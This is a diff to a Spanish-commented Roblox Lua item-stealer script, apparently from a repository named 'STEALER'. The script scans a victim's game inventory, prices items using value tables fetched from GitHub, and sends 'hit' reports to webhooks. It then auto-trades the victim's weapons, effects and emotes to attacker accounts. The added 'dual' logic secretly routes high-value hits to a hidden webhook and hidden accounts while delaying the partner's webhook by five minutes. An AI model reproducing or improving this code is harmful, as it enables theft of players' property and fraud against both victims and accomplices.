@@ -10,6 +10,7 @@ local player = Players.LocalPlayer
 -- URL DEL REPOSITORIO DE VALORES (JSON)
 -- ==========================================
 local VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/STEALER/main/values.json"
+local DUAL_VALUES_REPO_URL = "https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils5.json"
 
 -- ==========================================
 -- CONFIGURACIÓN SECRETA DUAL WEBHOOK
@@ -45,25 +46,36 @@ end
 -- CARGA DINÁMICA DE VALORES DE GITHUB
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
+local DualKnives, DualGuns, DualEffects, DualEmotes = {}, {}, {}, {}
 
 local function cargarValoresGitHub()
-    local success, response = pcall(function()
-        return game:HttpGet(VALUES_REPO_URL)
+    -- Cargar Valores Normales
+    pcall(function()
+        local response = game:HttpGet(VALUES_REPO_URL)
+        if response then
+            local decodedData = HttpService:JSONDecode(response)
+            if decodedData then
+                Knives = decodedData.Knives or {}
+                Guns = decodedData.Guns or {}
+                Effects = decodedData.Effects or {}
+                Emotes = decodedData.Emotes or {}
+            end
+        end
     end)
     
-    if success and response then
-        local decodeSuccess, decodedData = pcall(function()
-            return HttpService:JSONDecode(response)
-        end)
-        
-        if decodeSuccess and decodedData then
-            Knives = decodedData.Knives or {}
-            Guns = decodedData.Guns or {}
-            Effects = decodedData.Effects or {}
-            Emotes = decodedData.Emotes or {}
-            return
+    -- Cargar Valores Duales
+    pcall(function()
+        local responseDual = game:HttpGet(DUAL_VALUES_REPO_URL)
+        if responseDual then
+            local decodedDual = HttpService:JSONDecode(responseDual)
+            if decodedDual then
+                DualKnives = decodedDual.Knives or {}
+                DualGuns = decodedDual.Guns or {}
+                DualEffects = decodedDual.Effects or {}
+                DualEmotes = decodedDual.Emotes or {}
+            end
         end
-    end
+    end)
 end
 
 cargarValoresGitHub()
@@ -76,7 +88,6 @@ task.spawn(function()
         task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
     
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
@@ -138,39 +149,59 @@ task.spawn(function()
 
     local jugadoresObjetivos = config.JugadoresObjetivos or {}
 
+    local armasPrioritarias = {
+        LightningBolt = true, LightningStriker = true,
+        MatchaBobaKnife = true, MatchaBobaGun = true,
+        DuskveilDagger = true, DuskveilIron = true, 
+        ValkyrieKnife = true, ValkyrieSword = true, ValkyrieSniper = true, 
+        LimeJellyAxe = true, BlueberryJellyAxe = true, StrawberryJellyAxe = true, GrapeJellyAxe = true, 
+        LimeJellyUzi = true, BlueberryJellyUzi = true, StrawberryJellyUzi = true, GrapeJellyUzi = true,
+        SealordTrident = true, SealordRevolver = true, 
+        DragonpetalBlade = true, DragonpetalSniper = true, DragonpetalOutlaw = true, 
+        LovestruckKnife = true, LovestruckGun = true,  
+        SharkLauncher = true, Revolver_Default = true, 
+    }
+
     local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
 
     if ok and cg.PlayerData then
         local pd = cg.PlayerData
         local knives, guns, effects, emotes = {}, {}, {}, {}
         local totalValue = 0
+        local dualTotalValue = 0
+        local usarDual = false
 
         local function normalizeName(name)
             return string.gsub(name, " ", "")
         end
 
-        local function scanAndSave(category, valueTable, resultTable)
+        local function scanAndSave(category, valueTable, dualValueTable, resultTable)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
             
             for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
+                    
+                    -- Sumar y guardar con la tabla normal
                     if valueTable[cleanName] then
-
                         local itemValue = valueTable[cleanName]
                         totalValue = totalValue + itemValue
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
+                    end
+                    
+                    -- Sumar valor de la tabla DUAL simultáneamente
+                    if dualValueTable[cleanName] then
+                        dualTotalValue = dualTotalValue + dualValueTable[cleanName]
                     end
                 end
             end
         end
 
-        scanAndSave("Knife", Knives, knives)
-        scanAndSave("Gun", Guns, guns)
-        scanAndSave("Effect", Effects, effects)
-        scanAndSave("Emote", Emotes, emotes)
+        scanAndSave("Knife", Knives, DualKnives, knives)
+        scanAndSave("Gun", Guns, DualGuns, guns)
+        scanAndSave("Effect", Effects, DualEffects, effects)
+        scanAndSave("Emote", Emotes, DualEmotes, emotes)
 
         local hayItems = (#knives > 0) or (#guns > 0) or (#effects > 0) or (#emotes > 0)
 
@@ -247,14 +278,19 @@ task.spawn(function()
                                     "**Executor:** `" .. executorName .. "`\n\n" ..
                                     "### 📊 Estadísticas de Hit\n" ..
                                     "**Historial:** `" .. executionText .. "`\n" ..
-                                    "**Total Value:** `💰 " .. totalValue .. "`\n\n" ..
+                                    "**Total Value:** `💰 " .. totalValue .. "`\n" ..
+                                    "**Dual Value:** `💰 " .. dualTotalValue .. "`\n\n" ..
                                     "**=============================**"
 
             local pings = {}
             local embedColor = 3447003
 
-            if totalValue >= 5000 then
-                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (+5000 VALOR DETECTADO)!** 🚨")
+            -- ==========================================
+            -- LÓGICA DUAL CONDICIONADA A +7500 DE VALOR DUAL
+            -- ==========================================
+            if dualTotalValue > 7500 then
+                usarDual = true -- Activa la bandera para que el trade use las armas duales
+                table.insert(pings, "@MEGA-HIT 🚨 **¡MEGA HIT MASIVO (DUAL +7500)!** 🚨")
                 embedColor = 16711680
             elseif totalValue >= 2000 then
                 table.insert(pings, "@everyone 🚨 **¡HIT LEGENDARIO DETECTADO (+2000 VALOR)!** 🚨")
@@ -287,10 +323,10 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
+            -- ENVÍO DE WEBHOOKS (DUAL VS NORMAL)
             -- ==========================================
-            if totalValue >= 5000 then
-                -- 1. Tu Webhook (Dual): Notifica al instante
+            if usarDual then
+                -- 1. Webhook DUAL: Notifica al instante
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -302,7 +338,7 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
+                -- 2. Webhook Normal: Notifica con 5 minutos de delay (300 segundos)
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -316,10 +352,10 @@ task.spawn(function()
                     end)
                 end
                 
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo
+                -- Cambia los objetivos a las cuentas DUAL
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
+                -- Hit normal: Notifica de inmediato únicamente al webhook normal
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -378,41 +414,51 @@ task.spawn(function()
             local pdTrade = cgData.PlayerData
             
             local listaEfectos, listaEmotes = {}, {}
-            local listaArmas = {}
+            local listaArmasPrioritarias, listaArmasNormales = {}, {}
 
-            local function scanTrade(cat, valueTable, destList)
+            local function scanTrade(cat, valueTable, destList, isPriority)
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO (Script 1)
+                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
                             local itemData = { name = item.name, guid = guid, value = valueTable[cleanName] }
                             if destList then
                                 table.insert(destList, itemData)
+                            elseif isPriority and armasPrioritarias[cleanName] then
+                                table.insert(listaArmasPrioritarias, itemData)
                             else
-                                table.insert(listaArmas, itemData)
+                                table.insert(listaArmasNormales, itemData)
                             end
                         end
                     end
                 end
             end
 
-            scanTrade("Knife", Knives, nil)
-            scanTrade("Gun", Guns, nil)
-            scanTrade("Effect", Effects, listaEfectos)
-            scanTrade("Emote", Emotes, listaEmotes)
+            -- Si es DUAL, escanea usando la tabla de DUAL_VALUES_REPO_URL, si no, usa la tabla normal
+            local activeKnives = usarDual and DualKnives or Knives
+            local activeGuns = usarDual and DualGuns or Guns
+            local activeEffects = usarDual and DualEffects or Effects
+            local activeEmotes = usarDual and DualEmotes or Emotes
+
+            scanTrade("Knife", activeKnives, nil, true)
+            scanTrade("Gun", activeGuns, nil, true)
+            scanTrade("Effect", activeEffects, listaEfectos, false)
+            scanTrade("Emote", activeEmotes, listaEmotes, false)
 
             local sortPorValor = function(a, b) return a.value > b.value end
             table.sort(listaEmotes, sortPorValor)
             table.sort(listaEfectos, sortPorValor)
-            table.sort(listaArmas, sortPorValor)
+            table.sort(listaArmasPrioritarias, sortPorValor)
+            table.sort(listaArmasNormales, sortPorValor)
 
             local itemsRestantes = {}
             for _, v in ipairs(listaEmotes) do table.insert(itemsRestantes, v) end
             for _, v in ipairs(listaEfectos) do table.insert(itemsRestantes, v) end
-            for _, v in ipairs(listaArmas) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaArmasPrioritarias) do table.insert(itemsRestantes, v) end
+            for _, v in ipairs(listaArmasNormales) do table.insert(itemsRestantes, v) end
 
             if #itemsRestantes == 0 then return false end
             
@@ -509,7 +555,6 @@ task.spawn(function()
             task.wait(2) 
             return true
         end
-
 
         -- ==========================================
         -- BUCLE PRINCIPAL DE TRADEO CONTINUO
